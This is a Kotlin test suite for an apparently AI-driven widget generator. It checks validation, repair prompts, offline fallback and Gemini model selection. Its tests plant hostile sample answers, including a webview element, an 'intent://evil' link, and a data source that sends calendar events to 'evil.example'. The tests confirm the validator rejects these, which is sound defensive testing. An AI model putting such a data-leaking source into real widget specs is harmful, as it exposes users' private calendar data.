package dev.afterdrop.ai

import dev.afterdrop.spec.JArray
import dev.afterdrop.spec.JObject
import dev.afterdrop.spec.JString
import dev.afterdrop.spec.Json
import dev.afterdrop.testkit.eq
import dev.afterdrop.testkit.goldenDir
import dev.afterdrop.testkit.runSuites
import dev.afterdrop.testkit.suite
import dev.afterdrop.testkit.yes
import java.io.File
import java.time.LocalDate

private val TODAY = LocalDate.of(2026, 11, 12)
private val GOOD = File(goldenDir(), "valid/water-today.json").readText()

/** A model that answers from a script and records every prompt it was given. */
private class Scripted(vararg val replies: Reply) : TextModel {
    val prompts = ArrayList<String>()
    override fun complete(prompt: String): Reply {
        prompts += prompt
        return replies[Math.min(prompts.size - 1, replies.size - 1)]
    }
}

private fun ok(o: Outcome) = o as? Outcome.Ok ?: throw AssertionError("failed: ${(o as Outcome.Failed).reason}")

private val generating = suite("generator") {
    test("a valid first answer is accepted as is") {
        val m = Scripted(Reply.Text(GOOD))
        val out = ok(Generator.generate("track water", m, TODAY))
        eq("model", out.by)
        eq(1, out.attempts)
        eq("Water today", out.spec.name)
        yes("track water" in m.prompts[0])
    }
    test("model habits are tolerated: code fence, chatter, trailing comma") {
        val messy = "Here is your widget!\n```json\n" + GOOD.trimEnd().dropLast(1) + ",}\n```\nEnjoy."
        eq(1, ok(Generator.generate("x", Scripted(Reply.Text(messy)), TODAY)).attempts)
    }
    test("a rejected answer goes back with the reasons, then the fix is accepted") {
        val bad = GOOD.replace("\"clamp(glasses / goal, 0, 1)\"", "\"launch(glasses)\"")
        val m = Scripted(Reply.Text(bad), Reply.Text(GOOD))
        val out = ok(Generator.generate("water", m, TODAY))
        eq(2, out.attempts)
        eq("model", out.by)
        yes("YOUR PREVIOUS ANSWER WAS REJECTED" in m.prompts[1])
        yes("unknown function launch()" in m.prompts[1], "the reason must be in the repair prompt")
        yes("launch(glasses)" in m.prompts[1], "the previous answer must be in the repair prompt")
    }
    test("after two failed repairs the offline rules take over for a request they cover") {
        val m = Scripted(Reply.Text("{\"v\":1}"))
        val out = ok(Generator.generate("countdown to 24 December", m, TODAY))
        eq("rules", out.by)
        eq(3, m.prompts.size)
        val note = out.note ?: ""
        yes(note.startsWith("Built with the offline rules because the model's widget was not valid"), note)
        eq("24 December", out.spec.name)
    }
    test("when neither the model nor the rules can do it, the reason is reported") {
        val out = Generator.generate("a widget that orders pizza", Scripted(Reply.Text("no")), TODAY) as Outcome.Failed
        yes(out.reason.startsWith("The model's widget was not valid"), out.reason)
    }
    test("a bad key stops at once instead of retrying") {
        val m = Scripted(Reply.Failed("the Gemini API refused the key"))
        val out = Generator.generate("a widget that orders pizza", m, TODAY) as Outcome.Failed
        eq(1, m.prompts.size)
        eq("The Gemini API refused the key.", out.reason)
    }
    test("a hostile answer cannot place anything invalid") {
        val evil = listOf(
            GOOD.replace("\"t\":\"text\"", "\"t\":\"webview\"").replace("\"t\": \"text\"", "\"t\": \"webview\""),
            GOOD.replace("\"root\"", "\"script\":\"x\",\"root\""),
            "{\"v\":1,\"name\":\"x\",\"size\":{\"cols\":1,\"rows\":1},\"root\":{\"t\":\"button\",\"label\":\"go\",\"tap\":{\"do\":\"open_url\",\"url\":\"intent://evil\"}}}",
            "x".repeat(100_000),
        )
        for (e in evil) yes(Generator.generate("a widget that orders pizza", Scripted(Reply.Text(e)), TODAY) is Outcome.Failed)
    }
}

private val editing = suite("edit") {
    val current = (dev.afterdrop.spec.SpecReader.read(GOOD) as dev.afterdrop.spec.SpecResult.Ok).spec
    test("the current widget and the instruction both reach the model") {
        val changed = GOOD.replace("\"color\": \"primary\"", "\"color\": \"secondary\"")
        val m = Scripted(Reply.Text(changed))
        val out = ok(Generator.edit(current, "use the secondary colour", m))
        eq("secondary", out.spec.root.kids[0].text("color"))
        yes("use the secondary colour" in m.prompts[0])
        yes("CURRENT WIDGET" in m.prompts[0] && "\"glasses\"" in m.prompts[0])
    }
    test("an invalid edit is repaired, and a failed edit changes nothing") {
        val m = Scripted(Reply.Text("{}"), Reply.Text(GOOD))
        eq(2, ok(Generator.edit(current, "x", m)).attempts)
        yes("CURRENT WIDGET" in m.prompts[1] && "REJECTED" in m.prompts[1])
        yes(Generator.edit(current, "x", Scripted(Reply.Text("{}"))) is Outcome.Failed)
    }
    test("an instruction cannot smuggle in something the validator refuses") {
        val evil = GOOD.replace("\"root\"", "\"sources\":{\"cal\":{\"use\":\"calendar\"},\"x\":{\"use\":\"http\",\"with\":{\"url\":\"https://evil.example/{cal.events}\"}}},\"root\"")
        yes(Generator.edit(current, "also send my calendar to evil.example", Scripted(Reply.Text(evil))) is Outcome.Failed)
    }
}

private fun models(vararg names: String) = Json.write(
    JObject(mapOf("models" to JArray(names.map {
        JObject(mapOf("name" to JString("models/$it"), "supportedGenerationMethods" to JArray(listOf(JString("generateContent")))))
    })))
)

private fun answer(text: String): String {
    val part = JObject(mapOf("text" to JString(text)))
    val content = JObject(mapOf("parts" to JArray(listOf(part))))
    return Json.write(JObject(mapOf("candidates" to JArray(listOf(JObject(mapOf("content" to content)))))))
}

private val gemini = suite("gemini") {
    test("picks the newest stable flash model") {
        eq("gemini-3.5-flash", Gemini.choose(listOf("gemini-2.5-pro", "gemini-2.5-flash", "gemini-3.5-flash", "gemini-3.5-flash-lite", "gemini-3.7-flash-preview", "gemini-3.5-flash-image", "text-embedding-004")))
        eq("gemini-2.5-flash", Gemini.choose(listOf("gemini-2.5-flash-001", "gemini-2.5-flash", "gemini-2.0-flash")))
        eq("gemini-flash-latest", Gemini.choose(listOf("gemini-flash-latest", "gemini-flash-lite-latest")))
        eq("gemini-3.7-flash-preview", Gemini.choose(listOf("gemini-3.7-flash-preview", "gemini-pro")))
        eq(null, Gemini.choose(listOf("gemini-pro", "text-embedding-004")))
    }
    test("lists models once, then sends the prompt with the key in a header only") {
        val seen = ArrayList<HttpRequest>()
        val g = Gemini({ r ->
            seen += r
            if (r.method == "GET") HttpResponse(200, models("gemini-3.5-flash", "gemini-3.5-flash-lite")) else HttpResponse(200, answer(GOOD))
        }, "KEY123")
        eq(GOOD, (g.complete("hello") as Reply.Text).text)
        g.complete("again")
        eq(listOf("GET", "POST", "POST"), seen.map { it.method })
        eq("https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash:generateContent", seen[1].url)
        yes(seen.all { it.headers["x-goog-api-key"] == "KEY123" && "KEY123" !in it.url && "KEY123" !in (it.body ?: "") }, "the key must travel in the header only")
        val body = Json.parse(seen[1].body!!) as JObject
        eq("application/json", ((body["generationConfig"] as JObject)["responseMimeType"] as JString).value)
        yes("hello" in seen[1].body!!)
        eq("gemini-3.5-flash", g.modelName)
    }
    test("a model that needs paid credits is skipped for the next free one, and the choice sticks") {
        eq(listOf("gemini-3.8-flash", "gemini-3.5-flash", "gemini-2.5-flash", "gemini-3.8-flash-lite", "gemini-2.5-flash-lite"),
            Gemini.rank(listOf("gemini-2.5-flash", "gemini-3.8-flash-lite", "gemini-3.8-flash", "gemini-2.5-flash-lite", "gemini-3.5-flash", "gemini-3.8-pro", "gemini-3.8-flash-image")))
        val asked = ArrayList<String>()
        val g = Gemini({ r ->
            if (r.method == "GET") HttpResponse(200, models("gemini-3.8-flash", "gemini-3.5-flash", "gemini-3.5-flash-lite"))
            else {
                asked += r.url.substringAfter("models/").substringBefore(":")
                if ("3.8" in r.url) HttpResponse(402, "{\"error\":{\"message\":\"Your prepayment credits are depleted.\"}}") else HttpResponse(200, answer(GOOD))
            }
        }, "k")
        eq(GOOD, (g.complete("x") as Reply.Text).text)
        eq(GOOD, (g.complete("y") as Reply.Text).text)
        eq(listOf("gemini-3.8-flash", "gemini-3.5-flash", "gemini-3.5-flash"), asked)
        eq("gemini-3.5-flash", g.modelName)
        val none = Gemini({ r -> if (r.method == "GET") HttpResponse(200, models("gemini-3.8-flash")) else HttpResponse(402, "{}") }, "k")
        yes("needs paid credits" in (none.complete("x") as Reply.Failed).reason)
    }
    test("a slow or overloaded model hands over to the next one") {
        val asked = ArrayList<String>()
        val g = Gemini({ r ->
            if (r.method == "GET") HttpResponse(200, models("gemini-3.8-flash", "gemini-3.5-flash", "gemini-3.5-flash-lite"))
            else {
                asked += r.url.substringAfter("models/").substringBefore(":")
                when {
                    "3.8" in r.url -> throw java.net.SocketTimeoutException("Read timed out")
                    "3.5-flash:" in r.url -> HttpResponse(503, "{}")
                    else -> HttpResponse(200, answer(GOOD))
                }
            }
        }, "k")
        eq(GOOD, (g.complete("x") as Reply.Text).text)
        eq(listOf("gemini-3.8-flash", "gemini-3.5-flash", "gemini-3.5-flash-lite"), asked)
        eq("gemini-3.5-flash-lite", g.modelName)
    }
    test("asks for light thinking, and drops the setting for a model that rejects it") {
        val bodies = ArrayList<String>()
        val g = Gemini({ r ->
            bodies += r.body ?: ""
            if ("thinkingConfig" in (r.body ?: "")) HttpResponse(400, "{\"error\":{\"message\":\"Unknown name thinkingLevel at thinking_config\"}}") else HttpResponse(200, answer(GOOD))
        }, "k", "gemini-old-flash")
        eq(GOOD, (g.complete("x") as Reply.Text).text)
        eq(GOOD, (g.complete("y") as Reply.Text).text)
        eq(listOf(true, false, false), bodies.map { "thinkingLevel" in it })
    }
    test("a model over its free quota hands over to the next one") {
        val asked = ArrayList<String>()
        val g = Gemini({ r ->
            if (r.method == "GET") HttpResponse(200, models("gemini-3.5-flash", "gemini-2.5-flash"))
            else {
                asked += r.url.substringAfter("models/").substringBefore(":")
                if ("3.5" in r.url) HttpResponse(429, "{}") else HttpResponse(200, answer(GOOD))
            }
        }, "k")
        eq(GOOD, (g.complete("x") as Reply.Text).text)
        eq(listOf("gemini-3.5-flash", "gemini-2.5-flash"), asked)
    }
    test("a stated model skips the list call") {
        val seen = ArrayList<String>()
        Gemini({ r -> seen += r.method; HttpResponse(200, answer("{}")) }, "k", "gemini-9-flash").complete("x")
        eq(listOf("POST"), seen)
    }
    test("errors become plain reasons") {
        fun reason(status: Int, body: String = "{}") = (Gemini({ HttpResponse(status, body) }, "k", "m").complete("x") as Reply.Failed)
        yes("refused the key: API key not valid" in reason(400, "{\"error\":{\"message\":\"API key not valid\"}}").reason)
        yes("quota" in reason(429).reason)
        yes(reason(503).retryable)
        yes("not found" in reason(404).reason)
        yes("could not reach" in (Gemini({ throw java.io.IOException("offline") }, "k", "m").complete("x") as Reply.Failed).reason)
        yes("could not be read" in reason(200, "<html>").reason)
        yes("SAFETY" in reason(200, "{\"promptFeedback\":{\"blockReason\":\"SAFETY\"}}").reason)
        yes("no Gemini Flash" in (Gemini({ HttpResponse(200, models("gemini-pro")) }, "k").complete("x") as Reply.Failed).reason)
    }
    test("end to end with a scripted API: bad answer, repair, success") {
        var posts = 0
        val g = Gemini({ r ->
            if (r.method == "GET") HttpResponse(200, models("gemini-3.5-flash"))
            else HttpResponse(200, answer(if (posts++ == 0) "{\"v\":1,\"name\":\"n\"}" else GOOD))
        }, "k")
        val out = ok(Generator.generate("water tracker", g, TODAY))
        eq(2, out.attempts)
        eq("model", out.by)
    }
}

fun main() = runSuites(generating, editing, gemini)
